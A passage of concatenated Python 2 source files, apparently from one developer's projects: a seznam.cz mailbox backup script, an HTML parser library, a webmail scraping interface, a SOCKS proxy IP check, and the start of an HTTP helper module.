		CREATE TABLE Directories(directory_id INTEGER PRIMARY KEY AUTOINCREMENT, name VARCHAR(1000) UNIQUE);
		CREATE TABLE Files(file_id INTEGER PRIMARY KEY AUTOINCREMENT, filename VARCHAR(50) UNIQUE, content BLOB);

		CREATE TABLE HaveFile(mail_id INTEGER PRIMARY KEY, file_id INTEGER UNIQUE);
		CREATE TABLE HaveDirectory(mail_id INTEGER PRIMARY KEY, directory_id INTEGER);
		""")
	db.commit()
except Exception, e:
	pass



# login and get list of directories
print "Logging in as '" + args.email + "'.."

try:
	mb = MailBoxAPI(args.email, password) 
	directories = mb.getDirectoryList(mb.login())
except Exception, e:
	sys.stderr.write(e.value + "\n")
	sys.exit(1)



# go only thru one directory
if args.directory != None:
	if args.directory in directories:
		tmp = {}
		tmp[args.directory] = directories[args.directory]
		directories = tmp
	else:
		sys.stderr.write("Unknown directory '" + args.directory + "'!\n")
		sys.exit(1)



dir_cnt = 0
for directory_name in directories.keys():
	try:
		db.execute("INSERT INTO Directories(name) VALUES(?)", (directory_name,))
	except Exception, e:
		print e

	dir_cnt += 1
	print 
	print "Downloading message list from", directory_name, "(" + str(dir_cnt) + "/" + str(len(directories)) + ")"

	cnt = 0
	message_list = mb.getMessageList(directories[directory_name])
	
	if args.start != None and args.start - 1 > 0 and args.start < len(message_list):
		message_list = message_list[args.start - 1:]
	
	for m in message_list:
		cnt += 1
		if args.start != None:
			print "\tDownloading message", cnt + args.start - 1, "from", len(message_list) + args.start - 1, "(" + directory_name + ")"
		else:
			print "\tDownloading message", cnt, "from", len(message_list), "(" + directory_name + ")"
		
		if db.execute("SELECT count(url) FROM Mails WHERE (url = ?)", (m.url,)).fetchone()[0] >= 1:
			continue
		
		# download message and attachments
		try:
			mb.getMessage(m)
		except Exception, e:
			print e
			try:
				mb.getMessage(m)
			except Exception, e:
				continue
		
		mb.getAttachments(m)
	
		# add mail into database
		try:
			db.execute("INSERT INTO Mails(url, from_address, subject, date, body, headers) VALUES(?, ?, ?, ?, ?, ?)",
				(
					m.url,
					m.m_from,
					m.subject,
					m.date,
					m.body,
					m.headers
				)
			)
		except Exception, e:
			print e
	
		# put mail into directory
		try:
			db.execute(
				"""
				INSERT INTO HaveDirectory(mail_id, directory_id) VALUES(
					(SELECT mail_id FROM Mails WHERE url = ?), 
					(SELECT directory_id FROM Directories WHERE name = ?)
				)
				""", 
				(m.url, directory_name)
			)
		except Exception, e:
			print e
	
		# link attachments
		if m.attachments != "":
			try:
				db.execute(
					"INSERT INTO Files(filename, content) VALUES(?, ?)", 
					(m.getMessageId() + ".zip", sqlite.Binary(m.attachments))
				)
			
				db.execute(
					"""
					INSERT INTO HaveFile(mail_id, file_id) VALUES(
						(SELECT mail_id FROM Mails WHERE url = ?),
						(SELECT file_id FROM Files WHERE filename = ?)
					)""",
					(m.url, m.getMessageId() + ".zip")
				)
			except Exception, e:
				print e
		
		if cnt % 5 == 0:
			db.commit()
	
	db.commit()

db.commit()
db.close()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
DHTMLParser in python v1.2.1 (19.11.2011) by Bystroushaak (bystrousak@kitakitsune.org)

This work is licensed under a Creative Commons 3.0 Unported License
(http://creativecommons.org/licenses/by/3.0/cz/).

Project page; https://github.com/Bystroushaak/DHTMLParser (branch python)

Created in Geany text editor.
"""

def unescape(input, quote = '"'):
	if len(input) < 2:
		return input

	output = ""
	old = input[0]
	older = ""
	
	for act in input[1:] + " ":
		if act == quote and old == "\\" and older != "\\":
			older = old
			old = act
			continue
		else:
			output += old
		
		older = old
		old = act
	
	return output


def escape(input, quote = '"'):
	output = ""
	
	for c in input:
		if c == quote:
			output += '\\'
		
		output += c
	
	return output


def rotate_buff(buff):
	"Rotate buffer (for each buff[i] = buff[i-1])"
	i = len(buff) - 1
	while i > 0:
		buff[i] = buff[i - 1]
		i -= 1

	return buff


class HTMLElement():
	"""
	Container for parsed html elements.
	
	You can create:
		HTMLElement() # blank element
		
		HTMLElement("<tag>") # from string containing tag (only one tag)
		
		HTMLElement("<tag>", {"param":"value"}) # tag (with or without <>) with parameters defined by dictionary 
		
		# These constructors are usefull for creating documents:
		HTMLElement("tag", {"param":"value"}, [HTMLElement("<tag1>"), HTMLElement("<tag2>"), ...])
		HTMLElement("tag", [HTMLElement("<tag1>"), HTMLElement("<tag2>"), ...])
		HTMLElement([HTMLElement("<tag1>"), HTMLElement("<tag2>"), ...])
	"""
	
	
	def __init__(self, tag = "", second = None, third = None):
		self.__element = None
		self.__tagname = ""
		
		self.__istag        = False
		self.__isendtag     = False
		self.__iscomment    = False
		self.__isnonpairtag = False
		
		self.childs = []
		self.params = {}
		self.endtag = None
		self.openertag = None
		
		# blah, constructor overloading in python sux :P
		if isinstance(tag, str) and second == None and third == None:
			self.__init_tag(tag)
		elif isinstance(tag, str) and isinstance(second, dict) and third == None:
			self.__init_tag_params(tag, second)
		elif isinstance(tag, str) and isinstance(second, dict) and (isinstance(third, list) or isinstance(third, tuple)) and len(third) > 0 and isinstance(third[0], HTMLElement):
			self.__init_tag_params(tag, second)
			self.childs = closeElements(third)
		elif isinstance(tag, str) and (isinstance(second, list) or isinstance(second, tuple)) and len(second) > 0 and isinstance(second[0], HTMLElement):
			self.__init_tag(tag)
			self.childs = closeElements(second)
		elif (isinstance(tag, list) or isinstance(tag, tuple)) and len(tag) > 0 and isinstance(tag[0], HTMLElement):
			self.__init_tag("")
			self.childs = closeElements(tag)
		else:
			raise Exception("Oh no, not this crap!")
	
	#===========================================================================
	#= Constructor overloading =================================================
	#===========================================================================
	def __init_tag(self, tag):
			self.__element = tag
			
			self.__parseIsTag()
			self.__parseIsComment()
			
			if not self.__istag or self.__iscomment:
				self.__tagname = self.__element
			else:
				self.__parseTagName()
			
			if self.__iscomment or not self.__istag:
				return
			
			self.__parseIsEndTag()
			self.__parseIsNonPairTag()
			
			if self.__istag and not self.__isendtag and "=" in self.__element:
				self.__parseParams()
	
	# used when HTMLElement(tag, params) is called - basically create string from tagname and params
	def __init_tag_params(self, tag, params):
		tag = tag.strip().replace(" ", "")
		nonpair = ""
		
		if tag.startswith("<"):
			tag = tag[1:]
		
		if tag.endswith("/>"):
			tag = tag[:-2]
			nonpair = " /"
		elif tag.endswith(">"):
			tag = tag[:-1]
		
		output = "<" + tag
		
		for key in params.keys():
			output += " " + key + '="' + escape(params[key], '"') + '"'
		
		self.__init_tag(output + nonpair + ">")
	
	
	#===========================================================================
	#= Finders =================================================================
	#===========================================================================
	def find(self, tag_name, params = None, fn = None):
		"Same as findAll, but without endtags. You can always get them from .endtag property.."
		
		dom = self.findAll(tag_name, params, fn)
		
		return filter(lambda x: not x.isEndTag(), dom)
		
	def findAll(self, tag_name, params = None, fn = None):
		"""	
		Simple search engine.
		 
		Finds elements and subelements which match patterns given by parameters.
		Allows searching defined by users lambda function.
		
		@param tag_name: Name of tag.
		@type tag_name: string
		
		@param params: Parameters of arg.
		@type params: dictionary
		
		@param fn: User defined function for search.
		@type fn: lambda function
		
		@return: Matches.
		@rtype: Array of HTMLElements
		"""
		output = []
		
		if fn != None:
			if fn(self):
				output.append(self)
		
		if self.__tagname == tag_name and self.__tagname != "" and self.__tagname != None:
			if params == None:
				output.append(self)
			else:
				tmp_stat = True
				
				for key in params.keys():
					if key not in self.params:
						tmp_stat = False
					elif params[key] != self.params[key]:
						tmp_stat = False
						
				if len(self.params) == 0:
					tmp_stat = False
				
				if tmp_stat:
					output.append(self)
		
		tmp = []
		for el in self.childs:
			tmp = el.findAll(tag_name, params, fn)
			
			if tmp != None and len(tmp) > 0:
				output.extend(tmp)
		
		return output

	#==========================================================================
	#= Parsers ================================================================
	#==========================================================================
	def __parseIsTag(self):
		if self.__element.startswith("<") and self.__element.endswith(">"):
			self.__istag = True
		else:
			self.__istag = False

	def __parseIsEndTag(self):
		last = ""
		self.__isendtag = False
		
		if self.__element.startswith("<") and self.__element.endswith(">"):
			for c in self.__element:
				if c == "/" and last == "<":
					self.__isendtag = True
				if ord(c) > 32:
					last = c

	def __parseIsNonPairTag(self):
		last = ""
		self.__isnonpairtag = False
		
		# Tags endings with /> are nonpair - do not mind whitespaces (< 32)
		if self.__element.startswith("<") and self.__element.endswith(">"):
			for c in self.__element:
				if c == ">" and last == "/":
					self.__isnonpairtag = True
					return
				if ord(c) > 32:
					last = c
		
		# Nonpair tags
		npt = [
			"br",
			"hr",
			"img",
			"input",
			"link",
			"meta",
			"spacer",
			"frame",
			"base"
		]
		
		if self.__tagname.lower() in npt:
			self.__isnonpairtag = True
		
	def __parseIsComment(self):
		if self.__element.startswith("<!--") and self.__element.endswith("-->"):
			self.__iscomment = True
		else:
			self.__iscomment = False

	def __parseTagName(self):
		for el in self.__element.split(" "):
			el = el.replace("/", "").replace("<", "").replace(">", "")
			if len(el) > 0:
				self.__tagname = el
				return

	def __parseParams(self):	
		# check if there are any parameters
		if " " not in self.__element or "=" not in self.__element:
			return
		
		# Remove '<' & '>'
		params = self.__element.strip()[1:-1].strip()
		# Remove tagname
		params = params[params.find(self.getTagName()) + len(self.getTagName()):].strip()
		
		# Parser machine
		next_state = 0
		key = ""
		value = ""
		end_quote = ""
		buff = ["", ""]
		for c in params:
			if next_state == 0: # key
				if c.strip() != "": # safer than list space, tab and all possible whitespaces in UTF
					if c == "=":
						next_state = 1
					else:
						key += c
			elif next_state == 1: # value decisioner
				if c.strip() != "": # skip whitespaces
					if c == "'" or c == '"':
						next_state = 3
						end_quote = c
					else:
						next_state = 2
						value += c
			elif next_state == 2: # one word parameter without quotes
				if c.strip() == "":
					next_state = 0
					self.params[key] = value
					key = ""
					value = ""
				else:
					value += c
			elif next_state == 3: # quoted string
				if c == end_quote and (buff[0] != "\\" or (buff[0]) == "\\" and buff[1] == "\\"):
					next_state = 0
					self.params[key] = unescape(value, end_quote)
					key = ""
					value = ""
					end_quote = ""
				else:
					value += c
				
			buff = rotate_buff(buff)
			buff[0] = c
			
		if key != "":
			if end_quote != "" and value.strip() != "":
				self.params[key] = unescape(value, end_quote)
			else:
				self.params[key] = value

	#===========================================================================
	#= Parsers =================================================================
	#===========================================================================
	def isTag(self):
		"True if element is tag (not content)."
		return self.__istag

	def isComment(self):
		"True if HTMLElement is html comment."
		return self.__iscomment

	def isEndTag(self):
		"True if HTMLElement is end tag (/tag)."
		return self.__isendtag

	def isNonPairTag(self, isnonpair = None):
		"True if HTMLElement is nonpair tag (br for example). Can also change state from pair to nonpair and so."
		if isnonpair == None:
			return self.__isnonpairtag
		else:
			self.__isnonpairtag = isnonpair
			if not isnonpair:
				self.endtag = None
				self.childs = []

	def isOpeningTag(self):
		"True if is opening tag."
		if (self.isTag() and not self.isComment() and not self.isEndTag() and not self.isNonPairTag()):
			return True
		else:
			return False
	
	def isEndTagTo(self, opener):
		"Returns true, if this element is endtag to opener."
		if self.__isendtag and opener.isOpeningTag():
			if self.__tagname.lower() == opener.getTagName().lower():
				return True
			else:
				return False
		else:
			return False

	def __str__(self):
		"Returns prettifyied tag with content."
		return self.prettify()
	
	def tagToString(self):
		"Returns tag (with parameters), without content or endtag."
		if not self.isOpeningTag():
			return self.__element
		else:
			output = "<" + str(self.__tagname)
			
			for key in self.params.keys():
				output += " " + key + "=\"" + escape(self.params[key], '"') + "\""
			
			return output + ">"
	
	def getTagName(self):
		"Returns tag name."
		return self.__tagname
	
	def getContent(self):
		"Returns content of tag (everything between opener and endtag)."
		output = ""
		
		for c in self.childs:
			if not c.isEndTag():
				output += c.prettify()
		
		if output.endswith("\n"):
			output = output[:-1]
		
		return output
	
	def prettify(self, depth = 0, separator = "  ", last = True, pre = False, inline = False):
		"Returns prettifyied tag with content. Same as toString()."
		output = ""
		
		if self.getTagName() != "" and self.tagToString().strip() == "":
			return ""
		
		# if not inside <pre> and not inline, shift tag to the right
		if not pre and not inline:
			output += (depth * separator)
		
		# for <pre> set 'pre' flag
		if self.getTagName().lower() == "pre" and self.isOpeningTag():
			pre = True
			separator = ""
		
		output += self.tagToString()
		
		# detect if inline
		is_inline = inline # is_inline shows if inline was set by detection, or as parameter
		for c in self.childs:
			if not (c.isTag() or c.isComment()):
				if len(c.tagToString().strip()) != 0:
					inline = True
		
		# don't shift if inside container (containers have blank tagname)
		original_depth = depth
		if self.getTagName() != "":
			if not pre and not inline: # inside <pre> doesn't shift tags
				depth += 1
				if self.tagToString().strip() != "":
					output += "\n"
		
		# prettify childs
		for e in self.childs:
			if not e.isEndTag():
				output += e.prettify(depth, last = False, pre = pre, inline = inline)
		
		# endtag
		if self.endtag != None:
			if not pre and not inline:
				output += ((original_depth) * separator)
				
			output += self.endtag.tagToString().strip()
			
			if not is_inline:
				output += "\n"
		
		return output
	
	#===========================================================================
	#= Setters =================================================================
	#===========================================================================
	def replaceWith(self, el):
		"Replace element. Useful when you don't want change all references to object."
		self.childs = el.childs
		self.params = el.params
		self.endtag = el.endtag
		self.openertag = el.openertag
		
		self.__tagname = el.getTagName()
		self.__element = el.tagToString()
		
		self.__istag = el.isTag()
		self.__isendtag = el.isEndTag()
		self.__iscomment = el.isComment()
		self.__isnonpairtag = el.isNonPairTag()
	
	
	def removeChild(self, child, end_tag_too = True):
		"""
		Remove subelement (child) specified by reference.
		
		This can't be used for removing subelements by value! If you want do such thing, do:
		
		---
		for e in dom.find("value"):
			dom.removeChild(e)
		---
		
		Params:
			child
				child which will be removed from dom (compared by reference)
			end_tag_too
				remove end tag too - default true
		"""
	
		if len(self.childs) <= 0:
			return
		
		end_tag = None
		if end_tag_too:
			end_tag = child.endtag
		
		for e in self.childs:
			if e == child:
				self.childs.remove(e)
			if end_tag_too and end_tag == e and end_tag != None:
				self.childs.remove(e)
			else:
				e.removeChild(child, end_tag_too)

def closeElements(childs):
	o = []
	
	for e in childs:
		if e.isTag():
			if not e.isNonPairTag() and not e.isEndTag() and not e.isComment() and e.endtag == None:
				e.childs = closeElements(e.childs)
				
				o.append(e)
				o.append(HTMLElement("</" + e.getTagName() + ">"))
				
				# Join opener and endtag
				e.endtag = o[-1]
				o[-1].openertag = e
			else:
				o.append(e)
		else:
			o.append(e)
	
	return o

def __raw_split(itxt):
	"""
	Parse HTML from text into array filled with tags end text.
	
	
	Source code is little bit unintutive, because it is simple parser machine.
	For better understanding, look at; http://kitakitsune.org/images/field_parser.png
	"""
	echr = ""
	buff = ["", "", "", ""]
	content = ""
	array = []
	next_state = 0
	inside_tag = False
	
	for c in itxt:
		if next_state == 0: # content
			if c == "<":
				if len(content) > 0:
					array.append(content)
				content = c
				next_state = 1
				inside_tag = False
			else:
				content += c
		elif next_state == 1: # html tag
			if c == ">":
				array.append(content + c)
				content = ""
				next_state = 0
			elif c == "'" or c == '"':
				echr = c
				content += c
				next_state = 2
			elif c == "-" and buff[0] == "-" and buff[1] == "!" and buff[2] == "<":
				if len(content[:-3]) > 0:
					array.append(content[:-3])
				content = content[-3:] + c
				next_state = 3
			else:
				if c == "<": # jump back into tag instead of content
					inside_tag = True
				content += c
		elif next_state == 2: # "" / ''
			if c == echr and (buff[0] != "\\" or (buff[0] == "\\" and buff[1] == "\\")):
				next_state = 1
			content += c
		elif next_state == 3: # html comments
			if c == ">" and buff[0] == "-" and buff[1] == "-":
				if inside_tag:
					next_state = 1
				else:
					next_state = 0
				inside_tag = False
				
				array.append(content + c)
				content = ""
			else:
				content += c
		
		# rotate buffer
		buff = rotate_buff(buff)
		buff[0] = c
	
	if len(content) > 0:
		array.append(content)
	
	return array

def __repair_tags(raw_input):
	"""
	Repair tags with comments (<HT<!-- asad -->ML> is parsed to ["<HT", "<!-- asad -->", "ML>"]
	and I need ["<HTML>", "<!-- asad -->"])
	"""
	ostack = []
	
	index = 0
	while index < len(raw_input):
		el = raw_input[index]
		
		if el.isComment():
			if index > 0 and index < len(raw_input):
				if raw_input[index - 1].tagToString().startswith("<") and raw_input[index + 1].tagToString().endswith(">"):
					ostack[-1] = HTMLElement(ostack[-1].tagToString() + raw_input[index + 1].tagToString())
					ostack.append(el)
					index += 1
					continue
		
		ostack.append(el)
		
		index += 1
	
	return ostack

def __indexOfEndTag(istack):
	"""
	Go through istack and search endtag. Element at first index is considered as opening tag.
	
	Returns: index of end tag or 0 if not found.
	"""
	if len(istack) <= 0:
		return 0
	
	if not istack[0].isOpeningTag():
		return 0
	
	opener = istack[0]
	cnt = 0
	
	index = 0
	for el in istack[1:]:
		if el.isOpeningTag() and (el.getTagName().lower() == opener.getTagName().lower()):
			cnt += 1
		elif el.isEndTagTo(opener):
			if cnt == 0:
				return index + 1
			else:
				cnt -= 1
				
		index += 1
	
	return 0

def __parseDOM(istack):
	"Recursively go through element array and create DOM."
	ostack = []
	end_tag_index = 0
	
	index = 0
	while index < len(istack):
		el = istack[index]
		
		end_tag_index = __indexOfEndTag(istack[index:]) # Check if this is pair tag
		
		if not el.isNonPairTag() and end_tag_index == 0 and not el.isEndTag():
			el.isNonPairTag(True)
		
		if end_tag_index != 0:
			el.childs = __parseDOM(istack[index + 1 : end_tag_index + index])
			el.endtag = istack[end_tag_index + index] # Reference to endtag
			el.openertag = el
			ostack.append(el)
			ostack.append(el.endtag)
			index = end_tag_index + index
		else:
			if not el.isEndTag():
				ostack.append(el)
		
		index += 1
	
	return ostack

def parseString(txt):
	"Parse given string and return DOM from HTMLElements."
	istack = []
	
	# remove UTF BOM (prettify fails if not)
	if txt.startswith("\xef\xbb\xbf"):
		txt = txt[3:]
	
	for el in __raw_split(txt):
		istack.append(HTMLElement(el))
	
	container = HTMLElement()
	container.childs = __parseDOM(__repair_tags(istack))
	
	return container#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# email.seznam.cz.interface.py v0.8.0 (25.11.2011) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/cz/).
# Created in Geany text editor.
#
# Notes:
    # Ugly, but finaly working..
# Imports ======================================================================
import sys

try:
	import CheckerTools as ch
except ImportError:
	sys.stderr.write("This script requires CheckerTools module.\n")
	sys.stderr.write("You can download it from https://github.com/Bystroushaak/CheckerTools\n")
	sys.exit(1)


try:
	import dhtmlparser as d
except ImportError:
	sys.stderr.write("This script requires DHTMLParser python module.\n")
	sys.stderr.write("You can download it from https://github.com/Bystroushaak/DHTMLParser/tree/python\n")
	sys.exit(1)



# Variables ====================================================================
ch.hcookies = True
login_url = "https://login.szn.cz/loginProcess"
mail_url  = "http://email.seznam.cz/folderScreen?sessionId=&amp;welcome=1&js=0"
mail_domain = "http://email.seznam.cz"


#= Functions & objects =========================================================
class InterfaceException(Exception):
	"General exception for this project."
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)


class InvalidDomainException(InterfaceException):
	"Throwed when user use ivalid domain in mail address."
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)


class BadLoginException(InterfaceException):
	"Throwed when user try login with bad password or username."
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)


class Message:
	"Class containing email informations."
	def __init__(self, url, m_from = "", to = "", subject = "", body = ""):
		self.url     = url
		self.m_from  = m_from
		self.to      = to
		self.date    = ""
		self.subject = subject
		self.body    = body
		self.headers = ""
		self.unread  = False
		
		self.attachments_url = ""
		self.attachments     = ""
	
	def __str__(self):
		o  = "URL:     " + self.url + "\n"
		o += "From:    " + self.m_from + "\n"
		o += "To:      " + self.to + "\n"
		o += "Date:    " + self.date + "\n"
		o += "Subject: " + self.subject + "\n"
		o += "Body:\n" + self.body + "\n"
		
		if self.headers != "":
			o += "\n--- Headers: ---\n\n"
			o += self.headers + "\n"
		
		if self.attachments != "":
			o += "Message has attachment.\n"
		
		return o
	
	def getMessageId(self):
		for param in self.url.split("&"):
			if "messageId" in param:
				return param.split("=")[-1]
		
		return ""
	
	def getFolderId(self):
		for param in self.url.split("&"):
			if "folderId" in param:
				return param.split("=")[-1]
		
		return ""


class MailBoxAPI:
	def __init__(self, email, password):
		self.email    = email
		self.password = password
		self.username = None
		self.domain   = None
	
	def __getUsernameDomain(self, email):
		# allowed domains
		domains = ["seznam.cz", "email.cz", "post.cz", "spoluzaci.cz", "stream.cz", "firmy.cz"]
		
		if "@" not in email:
			raise InvalidDomainException("No domain detected in '" + str(email) + "'!")
		
		username, domain = email.lower().split("@")
		
		if domain not in domains:
			raise InvalidDomainException("Invalid domain '" + str(domain) + "'!")
		
		return username, domain


	def login(self):
		"""Log user into email.
		
		@param email: Email address registered at seznam.cz.
		@type email: string
		
		@type password: string
		
		@return: String containing mailbox html code.
		@rtype: string
		
		@raise InvalidDomainException: If bad email domain is used.
		@raise BadLoginException: ..
		"""
		# get username and domain
		if self.username == None or self.domain == None:
			self.username, self.domain = self.__getUsernameDomain(self.email)
		
		ch.getPage("http://seznam.cz")
		
		# send login request (login.szn.cz)
		data = ch.getPage(login_url, post = {
			"loggedURL" : "http://email.seznam.cz/ticket",
			"serviceId" : "email",
			"lang"      : "cz",
			"template"  : "html",
			"disableSSL": "1",
			"forceSSL"  : "0",
			"username"  : self.username,
			"domain"    : self.domain,
			"password"  : self.password,
			"js"        : "0",
			"remember"  : "1"
		})
		
		# login.seznam.cz
		url = filter(lambda url: url.startswith("http://login"), data.split('"'))[0].replace("&amp;", "&")
		data = ch.getPage(url)
		
		# transport cookies
		try:
			ch.cookies["email.seznam.cz"] = ch.cookies["login.seznam.cz"]
		except KeyError: # can't transport when can't login
			raise BadLoginException("Bad username or password!")
		
		# blah
		data = ch.getPage("http://email.seznam.cz/ticket")
		data = ch.getPage("http://email.seznam.cz/gate")
		data = ch.getPage("http://email.seznam.cz/folderScreen?sessionId=&amp;welcome=1&js=0")
		
		return data


	def getDirectoryList(self, data = None):
		"""
		Returns dictionary with directories in email account with system defined (Doručené, Odeslané etc..).
		
		@return: Folder title : local url
		@rtype: dictionary
		"""
		if data == None:
			data = ch.getPage(mail_url)
		
		if "Vypis zpráv" not in data:
			raise BadLoginException("You have to login first!")
		
		# filter links
		dom = d.parseString(data)
		
		folders = dom.find("div", {"id":"menu", "data-dot":"menu"})[0]
		folders = folders.find("a")
		folders = filter(lambda x: "href" in x.params and "title" in x.params, folders)
		
		output = {}
		for f in filter(lambda x: "folderScreen" in x.params["href"], folders):
			output[f.params["title"]] = mail_domain + f.params["href"].replace("&amp;", "&")
		
		return output


	def getMessageList(self, directory_url, _first_call = True):
		"""
		Returns message liest.
		
		@return: [message_url:subject]
		@rtype:  dictionary
		"""
		output = []
		
		dom = d.parseString(ch.getPage(directory_url))
		
		# find links to messages
		unread = False
		for e in dom.find("tr"):
			if "class" in e.params and e.params["class"] == "unread":
				unread = True
			else:
				unread = False
			
			e = e.find("td", {"class" : "td-subject"})[0]
			for a in e.find("a"):
				if "href" in a.params:
					m = Message(mail_domain + a.params["href"].replace("&amp;", "&"))
					m.subject = a.getContent().strip()
					m.unread = unread
					output.append(m)
		
		# if first call, go to all pages
		if _first_call:
			paging = []
			konec = ""
			for e in dom.find("div", {"class":"paging"}):
				for a in e.find("a"):
					if "href" in a.params:
						if "Na konec" in a.getContent().strip():
							konec = mail_domain + "/folderScreen" + a.params["href"].replace("&amp;", "&")
							break
			
			# go through all pages
			if konec != "":
				# max atribut in 'offset'
				konec_n = konec.split("offset=")[-1]
				konec_n = int(konec_n)
				
				size = len(output)
				act = size
				while act <= konec_n:
					output.extend(self.getMessageList(konec.replace("offset=" + str(konec_n), "offset=" + str(act)), False))
					act += size
		
		return output


	def getMessage(self, m):
		"""Download message given by Message object prefilled with url parameter from getMessageList()."""
		dom = d.parseString(ch.getPage(m.url))
		
		text = dom.find("div", {"class":"content"})[0].getContent()
		text = text.replace('<div class="min-height">\n</div>', "")
		
		# link to page with message headers
		headers_url = dom.find("a", {"id":"show-mail-head"})[0].params["href"]
		
		# parse basic informations about message
		mail_info = dom.find("div", {"class":"mail-info", "id":"mhead"})[0]
		
		# parse from
		m_from = ""
		for span in mail_info.find("p", {"id":"from"})[0].find("span"):
			if "title" in span.params and "@" in span.params["title"]:
				m_from = span.getContent()
		# clean from
		m_from = ch.removeTags(m_from.replace("&lt;", "").replace("&gt;", ""))
		for l in m_from.splitlines():
			if "@" in l:
				m_from = l.strip()
				
		# parse subject
		subject = mail_info.find("p")[1].find("span", {"class":"block"})[0].getContent()
		
		# parse date
		date = mail_info.find("p")[2].find("span", {"class":"block"})[0].getContent()
		
		# add informations to message
		m.m_from  = m_from
		m.subject = ch.removeTags(subject).strip()
		m.body    = text
		m.date    = ch.removeTags(date).strip()
		
		# parse attachments
		attachments = dom.find("div", {"class":"attachments"})
		if len(attachments) > 0:
			attachments = attachments[0]
		
			for a in attachments.find("a"):
				if "href" in a.params and "getArchive" in a.params["href"]:
					m.attachments_url = mail_domain + a.params["href"].replace("&amp;", "&")
		
		# get headers
		h_dom = d.parseString(ch.getPage(mail_domain + headers_url.replace("&amp;", "&")))
		m.headers = h_dom.find("pre")[0].getContent().replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&")
		
		# set message status as unread, if message was unread
		if m.unread:
			hash_id = dom.find("input", {"name":"hashId"})[0]
			hash_id = hash_id.params["value"]
		
			post = {
				"sessionId":"",
				"hashId":hash_id,
				"folderId":m.getFolderId(),
				"color":"",
				"searchURI":"",
				"offset":"0",
				"action":"unread",
				"submit":"OK",
				"sort":"date_desc",
				"messageId":m.getMessageId()
			}
		
			ch.getPage(
				"http://email.seznam.cz/folderProcess",
				None, 
				post
			)
	
	def getAttachments(self, m):
		"""
		Download all attachments as .zip and save it into m.attachments.
		
		param m: Message returned from getMessage()
		type m: Message()
		"""
		if m.attachments_url != "":
			m.attachments = ch.getPage(m.attachments_url)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# IPtools v1.0.0 (06.06.2011) by Bystroushaak (bystrousak@kitakitsune.org)
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import sys
import socket
import os

import socks
import CheckerTools as ch


ip = ["", ""]
#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def getIP():
	ipstr = filter(lambda x: x.startswith("Vaše IP"), ch.getPage("http://anoncheck.security-portal.cz/").splitlines())[0]
	return "".join(filter(lambda x: x.isdigit() or x == ".", list(ipstr)))
	

def installProxy(SOCK_ADDR, SOCK_PORT):
	print "Checking proxy ..",
	sys.stdout.flush()

	# get normal ip
	try:
		ip[0] = getIP()
	except:
		sys.stderr.write("Can't connect to internet!\n")
		sys.exit(11)

	# apply proxy
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, SOCK_ADDR, SOCK_PORT)
	socket.socket = socks.socksocket

	# get ip over proxy
	try:
		ip[1] = getIP()
	except:
		sys.stderr.write("your SOCK5 proxy (" + SOCK_ADDR + ":" + str(SOCK_PORT) + ") isn't responding!\n")
		sys.exit(11)

	if ip[0] == ip[1]:
		sys.stderr.write("this proxy doesn't hides your IP, use better one!\n")
		sys.exit(11)
	else:
		print "ok"
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
CheckerTools v1.5.1 (10.09.2011) - https://github.com/Bystroushaak/CheckerTools
by Bystroushaak (bystrousak@kitakitsune.org)

This work is licensed under a Creative Commons (http://creativecommons.org/licenses/by/3.0/cz/).

Created in Geany text editor. This module uses epydoc.
"""
#===============================================================================
# Imports ======================================================================
#===============================================================================
import urllib
import urllib2
import re


#===============================================================================
# Variables ====================================================================
#===============================================================================
__version = "1.5.1"


IEHeaders = {
	"User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8; windows-1250",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
"Headers from Internet explorer."

LFFHeaders = {
	"User-Agent": "Mozilla/5.0 (X11; U; Linux i686; cs; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3",
	"Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
	"Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
	"Accept-Charset": "utf-8; windows-1250",
	"Keep-Alive": "300",
	"Connection": "keep-alive",
}
"Headers from Firefox 3.6.3 on linux."


hcookies = False
cookies = {}
"Variable where are stored cookies."

#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def getDomain(url):
	"""
	Parse domain from url.

	@param url: URL
	@type  url: string

	@return: Domain
	@rtype:  string
	"""
	if "://" in url:
		url = url.split("://")[1]
		
	if "/" in url:
		url = url.split("/")[0]

	return url


def getPage(url, get = None, post = None, headers = IEHeaders, handle_cookies = False):
	"""
	Function for easy work with HTTP protocol.

	@param url: URL - if not "://" in url, url will be transformed into "http://" + url
	@type  url: string

	@param get: Params which will be sended as GET.
	@type  get: dictionary

	@param post: Parameters for url. Default None.
	@type  post: dictionary

	@param headers: Headers sended when downloading url. Default IEHeaders.
	@type  headers: dictionary
	@see: IEHeaders
	@see: LFFHeaders
	
	@param handle_cookies: If True, function will use cookies.
						   Cookies are stored in global variable cookies.
						   If you dont want set this parameter to true with every call,
						   you can set module variable hcookies to True.
	@type  handle_cookies: bool
	@see: hcookies

	@return: content of downloaded url
	@rtype: Binary data or text, depends on type of downloaded content.
	"""
	# POST params
	if post != None:
		post = urllib.urlencode(post)
		
	# append GET params to url
	if get != None:
		get = urllib.urlencode(get)
		if "?" in url:
			if url[-1] == "&":
				url += get
			else:
				url += "&" + get
		else:
			url += "?" + get
			
		get = None
	   
	# url protocol check
	if not "://" in url:
		url = "http://" + url

	# add cokies into headers
	if hcookies or handle_cookies:
		domain = getDomain(url)
		if domain in cookies.keys():
			cookie_string = ""
			for key in cookies[domain].keys():
				cookie_string += key + "=" + str(cookies[domain][key]) + "; "
				
